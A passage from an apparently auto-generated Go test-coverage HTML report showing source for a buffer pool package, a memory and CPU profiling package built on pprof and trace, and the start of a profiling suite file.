// - Small buffers (‚â§1KB): For short strings, config values, small JSON
// - Medium buffers (‚â§8KB): For file paths, moderate content, API responses
// - Large buffers (‚â§64KB): For file content, large transformations, diffs
//
// Parameters:
// - size: Minimum required buffer capacity in bytes
//
// Returns:
// - *bytes.Buffer from the appropriate pool, ready for use
//
// Performance Notes:
// - Buffers are pre-allocated with appropriate capacity to minimize reallocations
// - Pool selection is based on required size, not buffer content
// - Returned buffers may have larger capacity than requested (which is beneficial)
func GetBuffer(size int) *bytes.Buffer <span class="cov8" title="1">{
        return getDefaultPool().GetBuffer(size)
}</span>

// PutBuffer returns a buffer to the appropriate pool after use.
//
// The buffer is cleaned and reset before pooling to ensure it's ready
// for the next use. Pool selection is based on the buffer's actual
// capacity to ensure proper categorization.
//
// Parameters:
// - buf: Buffer to return to the pool (can be nil)
//
// Behavior:
// - Nil buffers are safely ignored
// - Buffers are reset to empty state before pooling
// - Oversized buffers are not pooled to prevent memory waste
// - Pool selection is based on buffer capacity, not original request size
// PutBuffer returns a buffer to the appropriate pool after use.
func (bp *BufferPool) PutBuffer(buf *bytes.Buffer) <span class="cov8" title="1">{
        if buf == nil </span><span class="cov8" title="1">{
                return
        }</span>

        // Reset the buffer to empty state for reuse
        <span class="cov8" title="1">buf.Reset()
        atomic.AddInt64(&amp;bp.stats.resets, 1)

        capacity := buf.Cap()

        // Return buffer to appropriate pool based on its capacity
        switch </span>{
        case capacity &lt;= SmallBufferThreshold:<span class="cov8" title="1">
                atomic.AddInt64(&amp;bp.stats.smallPuts, 1)
                bp.smallBufferPool.Put(buf)</span>
        case capacity &lt;= MediumBufferThreshold:<span class="cov8" title="1">
                atomic.AddInt64(&amp;bp.stats.mediumPuts, 1)
                bp.mediumBufferPool.Put(buf)</span>
        case capacity &lt;= LargeBufferThreshold:<span class="cov8" title="1">
                atomic.AddInt64(&amp;bp.stats.largePuts, 1)
                bp.largeBufferPool.Put(buf)</span>
        case capacity &lt;= MaxPoolableSize:<span class="cov0" title="0">
                // For buffers between large threshold and max poolable size,
                // put them in the large pool to avoid waste
                atomic.AddInt64(&amp;bp.stats.largePuts, 1)
                bp.largeBufferPool.Put(buf)</span>
        default:<span class="cov8" title="1">
                // Don't pool very large buffers - let them be garbage collected
                // This prevents the pool from growing unbounded with oversized buffers
                atomic.AddInt64(&amp;bp.stats.oversized, 1)</span>
        }
}

// PutBuffer returns a buffer to the appropriate pool after use.
//
// The buffer is cleaned and reset before pooling to ensure it's ready
// for the next use. Pool selection is based on the buffer's actual
// capacity to ensure proper categorization.
//
// Parameters:
// - buf: Buffer to return to the pool (can be nil)
//
// Behavior:
// - Nil buffers are safely ignored
// - Buffers are reset to empty state before pooling
// - Oversized buffers are not pooled to prevent memory waste
// - Pool selection is based on buffer capacity, not original request size
func PutBuffer(buf *bytes.Buffer) <span class="cov8" title="1">{
        getDefaultPool().PutBuffer(buf)
}</span>

// WithBuffer executes a function with a pooled buffer and ensures cleanup.
//
// This function provides automatic buffer lifecycle management using
// the defer pattern. The buffer is automatically returned to the pool
// after the function completes, even if an error occurs.
//
// Parameters:
// - size: Minimum required buffer capacity in bytes
// - fn: Function to execute with the buffer
//
// Returns:
// - Error returned by the provided function
//
// Usage Example:
//
//        err := pool.WithBuffer(1024, func(buf *bytes.Buffer) error {
//            buf.WriteString("Hello, ")
//            buf.WriteString("World!")
//            result := buf.String()
//            return processResult(result)
//        })
func WithBuffer(size int, fn func(*bytes.Buffer) error) error <span class="cov8" title="1">{
        buf := GetBuffer(size)
        defer PutBuffer(buf)
        return fn(buf)
}</span>

// WithBufferResult executes a function with a pooled buffer and returns a result.
//
// This function is similar to WithBuffer but allows returning a result value
// along with an error. This is useful for operations that need to extract
// data from the buffer before it's returned to the pool.
//
// Parameters:
// - size: Minimum required buffer capacity in bytes
// - fn: Function to execute with the buffer, returning a result and error
//
// Returns:
// - Result of type T returned by the provided function
// - Error returned by the provided function
//
// Usage Example:
//
//        result, err := pool.WithBufferResult[string](1024, func(buf *bytes.Buffer) (string, error) {
//            buf.WriteString("Processing data...")
//            return buf.String(), nil
//        })
func WithBufferResult[T any](size int, fn func(*bytes.Buffer) (T, error)) (T, error) <span class="cov8" title="1">{
        buf := GetBuffer(size)
        defer PutBuffer(buf)
        return fn(buf)
}</span>

// GetStats returns current buffer pool statistics.
//
// Returns:
// - Stats structure containing detailed usage metrics
//
// Usage:
// This function is useful for monitoring pool effectiveness, detecting
// memory usage patterns, and optimizing pool configurations.
// GetStats returns current buffer pool statistics.
func (bp *BufferPool) GetStats() Stats <span class="cov8" title="1">{
        return Stats{
                SmallPool: Metrics{
                        Gets: atomic.LoadInt64(&amp;bp.stats.smallGets),
                        Puts: atomic.LoadInt64(&amp;bp.stats.smallPuts),
                },
                MediumPool: Metrics{
                        Gets: atomic.LoadInt64(&amp;bp.stats.mediumGets),
                        Puts: atomic.LoadInt64(&amp;bp.stats.mediumPuts),
                },
                LargePool: Metrics{
                        Gets: atomic.LoadInt64(&amp;bp.stats.largeGets),
                        Puts: atomic.LoadInt64(&amp;bp.stats.largePuts),
                },
                Oversized: atomic.LoadInt64(&amp;bp.stats.oversized),
                Resets:    atomic.LoadInt64(&amp;bp.stats.resets),
        }
}</span>

// GetStats returns current buffer pool statistics.
//
// Returns:
// - Stats structure containing detailed usage metrics
//
// Usage:
// This function is useful for monitoring pool effectiveness, detecting
// memory usage patterns, and optimizing pool configurations.
func GetStats() Stats <span class="cov8" title="1">{
        return getDefaultPool().GetStats()
}</span>

// Stats contains buffer pool usage statistics
type Stats struct {
        SmallPool  Metrics `json:"small_pool"`
        MediumPool Metrics `json:"medium_pool"`
        LargePool  Metrics `json:"large_pool"`
        Oversized  int64   `json:"oversized"` // Operations with oversized buffers
        Resets     int64   `json:"resets"`    // Buffer resets performed
}

// Metrics contains metrics for an individual pool
type Metrics struct {
        Gets int64 `json:"gets"` // Number of buffers retrieved from pool
        Puts int64 `json:"puts"` // Number of buffers returned to pool
}

// Efficiency calculates the pool efficiency as a percentage
func (pm Metrics) Efficiency() float64 <span class="cov8" title="1">{
        if pm.Gets == 0 </span><span class="cov8" title="1">{
                return 0
        }</span>
        <span class="cov8" title="1">return float64(pm.Puts) / float64(pm.Gets) * 100</span>
}

// ResetStats resets all pool statistics to zero.
//
// This function is primarily useful for testing or when fresh
// statistics are needed for monitoring purposes.
// ResetStats resets all pool statistics to zero.
func (bp *BufferPool) ResetStats() <span class="cov8" title="1">{
        atomic.StoreInt64(&amp;bp.stats.smallGets, 0)
        atomic.StoreInt64(&amp;bp.stats.smallPuts, 0)
        atomic.StoreInt64(&amp;bp.stats.mediumGets, 0)
        atomic.StoreInt64(&amp;bp.stats.mediumPuts, 0)
        atomic.StoreInt64(&amp;bp.stats.largeGets, 0)
        atomic.StoreInt64(&amp;bp.stats.largePuts, 0)
        atomic.StoreInt64(&amp;bp.stats.oversized, 0)
        atomic.StoreInt64(&amp;bp.stats.resets, 0)
}</span>

// ResetStats resets all pool statistics to zero.
//
// This function is primarily useful for testing or when fresh
// statistics are needed for monitoring purposes.
func ResetStats() <span class="cov8" title="1">{
        getDefaultPool().ResetStats()
}</span>

// EstimateBufferSize provides size estimation for common operations.
//
// This function helps developers choose appropriate buffer sizes
// for different types of operations, improving pool utilization.
//
// Parameters:
// - operation: Type of operation being performed
// - dataSize: Size of input data (if applicable)
//
// Returns:
// - Estimated buffer size in bytes
func EstimateBufferSize(operation string, dataSize int) int <span class="cov8" title="1">{
        switch operation </span>{
        case "json_marshal":<span class="cov8" title="1">
                // JSON typically expands by 20-50% due to quotes and structure
                return maxInt(dataSize*2, SmallBufferThreshold)</span>
        case "string_concat":<span class="cov8" title="1">
                // String concatenation - use exact size plus some padding
                return maxInt(dataSize+256, SmallBufferThreshold)</span>
        case "template_transform":<span class="cov8" title="1">
                // Template transformation can expand significantly
                return maxInt(dataSize*3, MediumBufferThreshold)</span>
        case "file_content":<span class="cov8" title="1">
                // File content processing - use file size as baseline
                return maxInt(dataSize+1024, MediumBufferThreshold)</span>
        case "git_diff":<span class="cov8" title="1">
                // Git diffs can be much larger than original content
                return maxInt(dataSize*5, LargeBufferThreshold)</span>
        default:<span class="cov8" title="1">
                // Default to medium buffer for unknown operations
                return MediumBufferThreshold</span>
        }
}

// Helper function for max calculation
func maxInt(a, b int) int <span class="cov8" title="1">{
        if a &gt; b </span><span class="cov8" title="1">{
                return a
        }</span>
        <span class="cov8" title="1">return b</span>
}
</pre>

		<pre class="file" id="file45" style="display: none">// Package profiling provides comprehensive memory and performance profiling capabilities for the broadcast system.
package profiling

import (
        "bufio"
        "context"
        "errors"
        "fmt"
        "io"
        "log"
        "os"
        "path/filepath"
        "runtime"
        "runtime/pprof"
        "runtime/trace"
        "strings"
        "sync"
        "time"
)

// Profiling errors
var (
        ErrProfilerNotEnabled    = errors.New("profiler is not enabled")
        ErrSessionExists         = errors.New("profiling session already exists")
        ErrSessionNotFound       = errors.New("profiling session not found")
        ErrSessionAlreadyStarted = errors.New("session already started")
        ErrProfileNotFound       = errors.New("profile not found")
)

// MemoryProfiler provides comprehensive memory profiling capabilities
// It captures heap profiles, allocation traces, and runtime statistics
type MemoryProfiler struct {
        outputDir string
        enabled   bool
        mu        sync.RWMutex

        // Active profiling sessions
        sessions map[string]*Session

        // Statistics
        profileCount  int64
        totalSessions int64
}

// Session represents an active profiling session
type Session struct {
        Name      string
        StartTime time.Time
        OutputDir string

        // Profile files
        cpuFile   *os.File
        heapFile  string
        traceFile *os.File

        // Session state
        started bool
        stopped bool
        mu      sync.Mutex
}

// NewMemoryProfiler creates a new memory profiler with the specified output directory
func NewMemoryProfiler(outputDir string) *MemoryProfiler <span class="cov8" title="1">{
        return &amp;MemoryProfiler{
                outputDir: outputDir,
                sessions:  make(map[string]*Session),
        }
}</span>

// Enable enables the memory profiler and creates the output directory
func (mp *MemoryProfiler) Enable() error <span class="cov8" title="1">{
        mp.mu.Lock()
        defer mp.mu.Unlock()

        if mp.enabled </span><span class="cov8" title="1">{
                return nil
        }</span>

        // Create output directory if it doesn't exist
        <span class="cov8" title="1">if err := os.MkdirAll(mp.outputDir, 0o750); err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to create profile output directory: %w", err)
        }</span>

        <span class="cov8" title="1">mp.enabled = true
        return nil</span>
}

// Disable disables the memory profiler and stops all active sessions
func (mp *MemoryProfiler) Disable() error <span class="cov8" title="1">{
        mp.mu.Lock()
        defer mp.mu.Unlock()

        if !mp.enabled </span><span class="cov8" title="1">{
                return nil
        }</span>

        // Stop all active sessions
        <span class="cov8" title="1">for _, session := range mp.sessions </span><span class="cov0" title="0">{
                if err := mp.stopSession(session); err != nil </span><span class="cov0" title="0">{
                        // Log error but continue stopping other sessions
                        log.Printf("Warning: failed to stop profiling session %s: %v\n", session.Name, err)
                }</span>
        }

        <span class="cov8" title="1">mp.enabled = false
        mp.sessions = make(map[string]*Session)

        return nil</span>
}

// StartProfiling begins a comprehensive profiling session
func (mp *MemoryProfiler) StartProfiling(name string) (*Session, error) <span class="cov8" title="1">{
        mp.mu.Lock()
        defer mp.mu.Unlock()

        if !mp.enabled </span><span class="cov8" title="1">{
                return nil, ErrProfilerNotEnabled
        }</span>

        // Check if session already exists
        <span class="cov8" title="1">if _, exists := mp.sessions[name]; exists </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("%w: %s", ErrSessionExists, name)
        }</span>

        // Create session
        <span class="cov8" title="1">sessionDir := filepath.Join(mp.outputDir, name)
        if err := os.MkdirAll(sessionDir, 0o750); err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to create session directory: %w", err)
        }</span>

        <span class="cov8" title="1">session := &amp;Session{
                Name:      name,
                StartTime: time.Now(),
                OutputDir: sessionDir,
        }

        // Start profiling
        if err := mp.startSession(session); err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to start profiling session: %w", err)
        }</span>

        <span class="cov8" title="1">mp.sessions[name] = session
        mp.totalSessions++

        return session, nil</span>
}

// StopProfiling stops the specified profiling session
func (mp *MemoryProfiler) StopProfiling(name string) error <span class="cov8" title="1">{
        mp.mu.Lock()
        defer mp.mu.Unlock()

        session, exists := mp.sessions[name]
        if !exists </span><span class="cov8" title="1">{
                return fmt.Errorf("%w: %s", ErrSessionNotFound, name)
        }</span>

        <span class="cov8" title="1">if err := mp.stopSession(session); err != nil </span><span class="cov0" title="0">{
                return err
        }</span>

        <span class="cov8" title="1">delete(mp.sessions, name)
        mp.profileCount++

        return nil</span>
}

// startSession initiates all profiling types for a session
func (mp *MemoryProfiler) startSession(session *Session) error <span class="cov8" title="1">{
        session.mu.Lock()
        defer session.mu.Unlock()

        if session.started </span><span class="cov8" title="1">{
                return ErrSessionAlreadyStarted
        }</span>

        // Start CPU profiling
        <span class="cov8" title="1">cpuFile := filepath.Join(session.OutputDir, "cpu.prof")
        cpu, err := os.Create(cpuFile) //nolint:gosec // Creating profile output file
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to create CPU profile file: %w", err)
        }</span>
        <span class="cov8" title="1">session.cpuFile = cpu

        if startErr := pprof.StartCPUProfile(cpu); startErr != nil </span><span class="cov8" title="1">{
                _ = cpu.Close() // Ignore error during cleanup
                return fmt.Errorf("failed to start CPU profiling: %w", startErr)
        }</span>

        // Prepare heap profile path
        <span class="cov8" title="1">session.heapFile = filepath.Join(session.OutputDir, "heap.prof")

        // Start execution trace
        traceFile := filepath.Join(session.OutputDir, "trace.out")
        traceF, err := os.Create(traceFile) //nolint:gosec // Creating profile output file
        if err != nil </span><span class="cov0" title="0">{
                pprof.StopCPUProfile()
                _ = cpu.Close() // Ignore error during cleanup
                return fmt.Errorf("failed to create trace file: %w", err)
        }</span>
        <span class="cov8" title="1">session.traceFile = traceF

        if err := trace.Start(traceF); err != nil </span><span class="cov0" title="0">{
                pprof.StopCPUProfile()
                _ = cpu.Close()    // Ignore error during cleanup
                _ = traceF.Close() // Ignore error during cleanup
                return fmt.Errorf("failed to start execution trace: %w", err)
        }</span>

        <span class="cov8" title="1">session.started = true
        return nil</span>
}

// stopSession stops all profiling for a session and generates reports
func (mp *MemoryProfiler) stopSession(session *Session) error <span class="cov8" title="1">{
        session.mu.Lock()
        defer session.mu.Unlock()

        if !session.started || session.stopped </span><span class="cov8" title="1">{
                return nil
        }</span>

        // Stop CPU profiling
        <span class="cov8" title="1">pprof.StopCPUProfile()
        if session.cpuFile != nil </span><span class="cov8" title="1">{
                _ = session.cpuFile.Close() // Ignore error during cleanup
        }</span>

        // Stop execution trace
        <span class="cov8" title="1">trace.Stop()
        if session.traceFile != nil </span><span class="cov8" title="1">{
                _ = session.traceFile.Close() // Ignore error during cleanup
        }</span>

        // Capture heap profile
        <span class="cov8" title="1">if err := mp.captureHeapProfile(session.heapFile); err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to capture heap profile: %w", err)
        }</span>

        // Capture additional profiles
        <span class="cov8" title="1">mp.captureAdditionalProfiles(session.OutputDir)

        // Generate analysis report
        if err := mp.generateAnalysisReport(session); err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to generate analysis report: %w", err)
        }</span>

        <span class="cov8" title="1">session.stopped = true
        return nil</span>
}

// captureHeapProfile captures a heap profile
func (mp *MemoryProfiler) captureHeapProfile(filename string) error <span class="cov8" title="1">{
        // Force garbage collection to get accurate heap state
        runtime.GC()
        runtime.GC() // Run twice to ensure cleanup

        f, err := os.Create(filename) //nolint:gosec // Creating profile output file
        if err != nil </span><span class="cov8" title="1">{
                return err
        }</span>
        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{ _ = f.Close() }</span>() // Ignore error in defer

        <span class="cov8" title="1">return pprof.WriteHeapProfile(f)</span>
}

// captureAdditionalProfiles captures goroutine, mutex, and block profiles
func (mp *MemoryProfiler) captureAdditionalProfiles(outputDir string) <span class="cov8" title="1">{
        profiles := []struct {
                name     string
                filename string
                debug    int
        }{
                {"goroutine", "goroutine.prof", 1},
                {"mutex", "mutex.prof", 1},
                {"block", "block.prof", 1},
                {"allocs", "allocs.prof", 0},
                {"threadcreate", "threadcreate.prof", 1},
        }

        for _, profile := range profiles </span><span class="cov8" title="1">{
                if err := mp.captureProfile(profile.name, filepath.Join(outputDir, profile.filename), profile.debug); err != nil </span><span class="cov8" title="1">{
                        // Log warning but continue with other profiles
                        log.Printf("Warning: failed to capture %s profile: %v\n", profile.name, err)
                }</span>
        }
}

// captureProfile captures a specific pprof profile
func (mp *MemoryProfiler) captureProfile(name, filename string, debug int) error <span class="cov8" title="1">{
        profile := pprof.Lookup(name)
        if profile == nil </span><span class="cov8" title="1">{
                return fmt.Errorf("%w: %s", ErrProfileNotFound, name)
        }</span>

        <span class="cov8" title="1">f, err := os.Create(filename) //nolint:gosec // Creating profile output file
        if err != nil </span><span class="cov8" title="1">{
                return err
        }</span>
        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{ _ = f.Close() }</span>() // Ignore error in defer

        <span class="cov8" title="1">return profile.WriteTo(f, debug)</span>
}

// writeToReport is a helper function that safely writes to report files, ignoring errors
func writeToReport(writer io.Writer, format string, args ...interface{}) <span class="cov8" title="1">{
        _, _ = fmt.Fprintf(writer, format, args...)
}</span>

// generateAnalysisReport creates a human-readable analysis report
func (mp *MemoryProfiler) generateAnalysisReport(session *Session) error <span class="cov8" title="1">{
        reportFile := filepath.Join(session.OutputDir, "analysis_report.txt")

        f, err := os.Create(reportFile) //nolint:gosec // Creating report output file
        if err != nil </span><span class="cov8" title="1">{
                return err
        }</span>
        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{ _ = f.Close() }</span>() // Ignore error in defer

        <span class="cov8" title="1">writer := bufio.NewWriter(f)
        defer func() </span><span class="cov8" title="1">{ _ = writer.Flush() }</span>() // Ignore error in defer

        // Write report header
        <span class="cov8" title="1">_, _ = fmt.Fprintf(writer, "Memory Profiling Analysis Report\n")
        _, _ = fmt.Fprintf(writer, "================================\n\n")
        _, _ = fmt.Fprintf(writer, "Session: %s\n", session.Name)
        _, _ = fmt.Fprintf(writer, "Start Time: %s\n", session.StartTime.Format(time.RFC3339))
        _, _ = fmt.Fprintf(writer, "Duration: %s\n", time.Since(session.StartTime))
        _, _ = fmt.Fprintf(writer, "Output Directory: %s\n\n", session.OutputDir)

        // Memory statistics
        var memStats runtime.MemStats
        runtime.ReadMemStats(&amp;memStats)

        _, _ = fmt.Fprintf(writer, "Memory Statistics\n")
        _, _ = fmt.Fprintf(writer, "-----------------\n")
        _, _ = fmt.Fprintf(writer, "Heap Alloc: %s\n", formatBytes(memStats.Alloc))
        _, _ = fmt.Fprintf(writer, "Heap Total: %s\n", formatBytes(memStats.TotalAlloc))
        _, _ = fmt.Fprintf(writer, "Heap Sys: %s\n", formatBytes(memStats.HeapSys))
        _, _ = fmt.Fprintf(writer, "Heap Objects: %d\n", memStats.HeapObjects)
        _, _ = fmt.Fprintf(writer, "Stack Sys: %s\n", formatBytes(memStats.StackSys))
        _, _ = fmt.Fprintf(writer, "MSpan Sys: %s\n", formatBytes(memStats.MSpanSys))
        _, _ = fmt.Fprintf(writer, "MCache Sys: %s\n", formatBytes(memStats.MCacheSys))
        _, _ = fmt.Fprintf(writer, "GC Sys: %s\n", formatBytes(memStats.GCSys))
        _, _ = fmt.Fprintf(writer, "Other Sys: %s\n", formatBytes(memStats.OtherSys))
        _, _ = fmt.Fprintf(writer, "Next GC: %s\n", formatBytes(memStats.NextGC))
        _, _ = fmt.Fprintf(writer, "Num GC: %d\n", memStats.NumGC)
        _, _ = fmt.Fprintf(writer, "Num Forced GC: %d\n", memStats.NumForcedGC)

        if memStats.NumGC &gt; 0 </span><span class="cov8" title="1">{
                _, _ = fmt.Fprintf(writer, "Last GC: %s ago\n", time.Since(time.Unix(0, int64(memStats.LastGC)))) //nolint:gosec // GC timestamp unlikely to overflow
                avgPause := float64(memStats.PauseTotalNs) / float64(memStats.NumGC) / 1e6
                _, _ = fmt.Fprintf(writer, "Average GC Pause: %.2f ms\n", avgPause)
        }</span>

        <span class="cov8" title="1">writeToReport(writer, "\nRuntime Statistics\n")
        writeToReport(writer, "------------------\n")
        writeToReport(writer, "Goroutines: %d\n", runtime.NumGoroutine())
        writeToReport(writer, "CPUs: %d\n", runtime.NumCPU())
        writeToReport(writer, "GOMAXPROCS: %d\n", runtime.GOMAXPROCS(-1))
        writeToReport(writer, "Go Version: %s\n", runtime.Version())
        writeToReport(writer, "Compiler: %s\n", runtime.Compiler)
        writeToReport(writer, "Architecture: %s\n", runtime.GOARCH)
        writeToReport(writer, "OS: %s\n", runtime.GOOS)

        // File information
        writeToReport(writer, "\nGenerated Profile Files\n")
        writeToReport(writer, "-----------------------\n")
        profileFiles := []string{
                "cpu.prof",
                "heap.prof",
                "trace.out",
                "goroutine.prof",
                "mutex.prof",
                "block.prof",
                "allocs.prof",
                "threadcreate.prof",
        }

        for _, filename := range profileFiles </span><span class="cov8" title="1">{
                filePath := filepath.Join(session.OutputDir, filename)
                if info, err := os.Stat(filePath); err == nil </span><span class="cov8" title="1">{
                        writeToReport(writer, "%s: %s (%s)\n", filename, formatBytes(uint64(info.Size())), info.ModTime().Format(time.RFC3339)) //nolint:gosec // File size unlikely to overflow
                }</span>
        }

        // Analysis commands
        <span class="cov8" title="1">writeToReport(writer, "\nAnalysis Commands\n")
        writeToReport(writer, "-----------------\n")
        writeToReport(writer, "CPU Profile Top Functions:\n")
        writeToReport(writer, "  go tool pprof -top %s\n", filepath.Join(session.OutputDir, "cpu.prof"))
        writeToReport(writer, "\nHeap Profile Top Allocations:\n")
        writeToReport(writer, "  go tool pprof -top %s\n", filepath.Join(session.OutputDir, "heap.prof"))
        writeToReport(writer, "\nInteractive CPU Analysis:\n")
        writeToReport(writer, "  go tool pprof %s\n", filepath.Join(session.OutputDir, "cpu.prof"))
        writeToReport(writer, "\nInteractive Heap Analysis:\n")
        writeToReport(writer, "  go tool pprof %s\n", filepath.Join(session.OutputDir, "heap.prof"))
        writeToReport(writer, "\nExecution Trace Analysis:\n")
        writeToReport(writer, "  go tool trace %s\n", filepath.Join(session.OutputDir, "trace.out"))

        return nil</span>
}

// CaptureMemStats captures current memory statistics
func CaptureMemStats(label string) MemorySnapshot <span class="cov8" title="1">{
        var stats runtime.MemStats
        runtime.ReadMemStats(&amp;stats)

        return MemorySnapshot{
                Label:      label,
                Timestamp:  time.Now(),
                MemStats:   stats,
                Goroutines: runtime.NumGoroutine(),
        }
}</span>

// MemorySnapshot represents memory state at a point in time
type MemorySnapshot struct {
        Label      string           `json:"label"`
        Timestamp  time.Time        `json:"timestamp"`
        MemStats   runtime.MemStats `json:"mem_stats"`
        Goroutines int              `json:"goroutines"`
}

// Compare compares two memory snapshots and returns the differences
func (ms MemorySnapshot) Compare(other MemorySnapshot) MemoryComparison <span class="cov8" title="1">{
        return MemoryComparison{
                From:            ms,
                To:              other,
                Duration:        other.Timestamp.Sub(ms.Timestamp),
                AllocDelta:      int64(other.MemStats.Alloc) - int64(ms.MemStats.Alloc),           //nolint:gosec // Memory stats unlikely to overflow
                TotalAllocDelta: int64(other.MemStats.TotalAlloc) - int64(ms.MemStats.TotalAlloc), //nolint:gosec // Memory stats unlikely to overflow
                HeapSysDelta:    int64(other.MemStats.HeapSys) - int64(ms.MemStats.HeapSys),       //nolint:gosec // Memory stats unlikely to overflow
                GCDelta:         int64(other.MemStats.NumGC) - int64(ms.MemStats.NumGC),
                GoroutineDelta:  other.Goroutines - ms.Goroutines,
        }
}</span>

// MemoryComparison represents the difference between two memory snapshots
type MemoryComparison struct {
        From            MemorySnapshot `json:"from"`
        To              MemorySnapshot `json:"to"`
        Duration        time.Duration  `json:"duration"`
        AllocDelta      int64          `json:"alloc_delta"`
        TotalAllocDelta int64          `json:"total_alloc_delta"`
        HeapSysDelta    int64          `json:"heap_sys_delta"`
        GCDelta         int64          `json:"gc_delta"`
        GoroutineDelta  int            `json:"goroutine_delta"`
}

// String returns a human-readable representation of the memory comparison
func (mc MemoryComparison) String() string <span class="cov8" title="1">{
        var result strings.Builder

        result.WriteString(fmt.Sprintf("Memory Comparison: %s ‚Üí %s (%.2fs)\n",
                mc.From.Label, mc.To.Label, mc.Duration.Seconds()))
        result.WriteString(fmt.Sprintf("  Heap Alloc: %+s\n", FormatBytesDelta(mc.AllocDelta)))
        result.WriteString(fmt.Sprintf("  Total Alloc: %+s\n", FormatBytesDelta(mc.TotalAllocDelta)))
        result.WriteString(fmt.Sprintf("  Heap Sys: %+s\n", FormatBytesDelta(mc.HeapSysDelta)))
        result.WriteString(fmt.Sprintf("  GC Count: %+d\n", mc.GCDelta))
        result.WriteString(fmt.Sprintf("  Goroutines: %+d\n", mc.GoroutineDelta))

        return result.String()
}</span>

// ProfileWithContext runs a function while profiling and returns memory comparison
func ProfileWithContext(_ context.Context, profiler *MemoryProfiler, name string, fn func() error) (MemoryComparison, error) <span class="cov8" title="1">{
        // Capture initial state
        startSnapshot := CaptureMemStats(fmt.Sprintf("%s_start", name))

        // Start profiling if profiler is provided
        if profiler != nil </span><span class="cov8" title="1">{
                _, err := profiler.StartProfiling(name)
                if err != nil </span><span class="cov8" title="1">{
                        return MemoryComparison{}, fmt.Errorf("failed to start profiling: %w", err)
                }</span>
                <span class="cov0" title="0">defer func() </span><span class="cov0" title="0">{
                        if stopErr := profiler.StopProfiling(name); stopErr != nil </span><span class="cov0" title="0">{
                                log.Printf("Warning: failed to stop profiling: %v\n", stopErr)
                        }</span>
                }()
        }

        // Run the function
        <span class="cov8" title="1">fnErr := fn()

        // Capture final state
        endSnapshot := CaptureMemStats(fmt.Sprintf("%s_end", name))

        // Return comparison and function error
        comparison := startSnapshot.Compare(endSnapshot)
        return comparison, fnErr</span>
}

// GetProfilerStats returns statistics about the profiler usage
func (mp *MemoryProfiler) GetProfilerStats() ProfilerStats <span class="cov8" title="1">{
        mp.mu.RLock()
        defer mp.mu.RUnlock()

        return ProfilerStats{
                Enabled:        mp.enabled,
                OutputDir:      mp.outputDir,
                ActiveSessions: len(mp.sessions),
                TotalSessions:  mp.totalSessions,
                ProfileCount:   mp.profileCount,
        }
}</span>

// ProfilerStats contains profiler usage statistics
type ProfilerStats struct {
        Enabled        bool   `json:"enabled"`
        OutputDir      string `json:"output_dir"`
        ActiveSessions int    `json:"active_sessions"`
        TotalSessions  int64  `json:"total_sessions"`
        ProfileCount   int64  `json:"profile_count"`
}

// formatBytes formats a byte count as a human-readable string
func formatBytes(bytes uint64) string <span class="cov8" title="1">{
        const unit = 1024
        if bytes &lt; unit </span><span class="cov8" title="1">{
                return fmt.Sprintf("%d B", bytes)
        }</span>
        <span class="cov8" title="1">div, exp := uint64(unit), 0
        for n := bytes / unit; n &gt;= unit; n /= unit </span><span class="cov8" title="1">{
                div *= unit
                exp++
        }</span>
        <span class="cov8" title="1">return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])</span>
}

// FormatBytesDelta formats a byte delta with appropriate sign and units
func FormatBytesDelta(delta int64) string <span class="cov8" title="1">{
        if delta == 0 </span><span class="cov8" title="1">{
                return "0 B"
        }</span>

        <span class="cov8" title="1">sign := ""
        if delta &gt; 0 </span><span class="cov8" title="1">{
                sign = "+"
        }</span>

        <span class="cov8" title="1">absBytes := uint64(delta)
        if delta &lt; 0 </span><span class="cov8" title="1">{
                absBytes = uint64(-delta)
                sign = "-"
        }</span>

        <span class="cov8" title="1">return sign + formatBytes(absBytes)</span>
}
</pre>

		<pre class="file" id="file46" style="display: none">package profiling

import (
        "context"
        "errors"
        "fmt"
        "log"
        "os"
        "os/exec"
        "path/filepath"
        "runtime"
        "runtime/pprof"
        "runtime/trace"
        "strings"
        "sync"
        "time"
)

// Suite errors
var (
        ErrProfilingSessionActive = errors.New("profiling session already active")
        ErrNoActiveSession        = errors.New("no active profiling session")
)

// ProfileSuite manages comprehensive profiling across multiple dimensions
type ProfileSuite struct {
        outputDir   string
        memProfiler *MemoryProfiler
        mu          sync.RWMutex

        // Active profiling session
        currentSession *ComprehensiveSession

        // Configuration
        config ProfileConfig

        // Session history
        sessionHistory []SessionSummary
}

// ComprehensiveSession represents a comprehensive profiling session
type ComprehensiveSession struct {
        Name      string
        StartTime time.Time
        OutputDir string

        // Profile files
        cpuFile    *os.File
        memSession *Session
        traceFile  *os.File

        // Additional profiles
        goroutineFile string
        blockFile     string
        mutexFile     string
        allocsFile    string

        // Session state
        started bool
        stopped bool
        mu      sync.Mutex

        // Performance metrics
        startSnapshot MemorySnapshot
        endSnapshot   MemorySnapshot
}

// ProfileConfig contains configuration for profiling sessions
type ProfileConfig struct {
        // Profiling types to enable
        EnableCPU    bool
        EnableMemory bool
        EnableTrace  bool
        EnableBlock  bool
        EnableMutex  bool

        // Block profiling rate (0 to disable)
        BlockProfileRate int

        // Mutex profiling fraction (0 to disable)
        MutexProfileFraction int

        // Report generation
        GenerateReports bool
        ReportFormat    string // "text", "html", "both"

        // Cleanup
        AutoCleanup       bool
        MaxSessionsToKeep int
}

// SessionSummary contains summary information about a completed session
type SessionSummary struct {
        Name         string        `json:"name"`
        StartTime    time.Time     `json:"start_time"`
        Duration     time.Duration `json:"duration"`
        OutputDir    string        `json:"output_dir"`
        ProfileTypes []string      `json:"profile_types"`
        FileCount    int           `json:"file_count"`
        TotalSize    int64         `json:"total_size_bytes"`
}

// NewProfileSuite creates a new comprehensive profiling suite
func NewProfileSuite(outputDir string) *ProfileSuite <span class="cov8" title="1">{
        return &amp;ProfileSuite{
                outputDir:   outputDir,
                memProfiler: NewMemoryProfiler(filepath.Join(outputDir, "memory")),
                config: ProfileConfig{
                        EnableCPU:            true,
                        EnableMemory:         true,
                        EnableTrace:          true,
